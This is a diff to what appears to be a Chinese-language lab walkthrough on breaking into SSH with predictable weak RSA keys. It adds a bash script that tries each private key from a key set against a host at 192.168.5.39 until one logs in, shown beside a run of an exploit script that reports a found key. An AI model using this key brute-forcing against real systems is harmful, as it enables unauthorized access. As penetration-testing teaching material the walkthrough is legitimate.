@@ -52,6 +52,26 @@ python2 5720.py rsa/2048 192.168.5.40 randy 22 5
 找到私钥 0028ca6d22c68ed0a1e3f6f79573100a-31671
 ```
 
+下面这个 linux shell 脚本也是可以的：
+
+```shell
+#!/bin/bash
+
+base_dir='./rsa/2048'
+host="192.168.5.39"
+port=22
+user="randy"
+for i in $(ls $base_dir -I '*.pub'); do
+    echo $i
+    ssh -tt -o PasswordAuthentication=no -i "$base_dir/$i" $user@$host -p $port
+    if [ $? -eq 0 ]; then
+        echo -e "\n\033[32mFind private keyfile: " "$base_dir/$i" "\033[0m"
+        break
+    fi
+done
+
+```
+
 进行登陆：
 
 ```
